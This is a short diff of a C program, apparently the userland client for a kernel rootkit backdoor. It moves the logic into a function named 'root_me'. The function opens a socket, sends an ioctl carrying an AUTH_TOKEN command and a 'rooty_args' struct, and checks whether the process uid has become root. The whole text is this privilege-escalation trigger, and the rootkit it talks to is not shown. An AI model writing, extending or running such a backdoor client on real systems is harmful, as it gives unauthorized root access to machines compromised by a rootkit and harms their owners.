@@ -18,13 +18,10 @@ struct rooty_args
     void *ptr;
 };
 
-int main ( int argc, char *argv[] )
-{
-    struct rooty_args rooty_args;
-    int sockfd;
-    int io;
 
-    sockfd = socket(AF_INET, SOCK_STREAM, 6);
+void root_me(int sockfd){
+    struct rooty_args rooty_args;
+    int io;
 
     rooty_args.cmd = 0;
     uid_t curr_uid =  getuid();
@@ -32,8 +29,16 @@ int main ( int argc, char *argv[] )
 
     printf("sent root cmd\n");
     io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
-    sleep(2);
     curr_uid =  getuid();
     printf("curr_uid : %d\n", curr_uid);
+}
+
+int main ( int argc, char *argv[] )
+{
+    int sockfd;
+    int io;
+    sockfd = socket(AF_INET, SOCK_STREAM, 6);
+    root_me(sockfd);
+
     printf("bye..\n");
 }
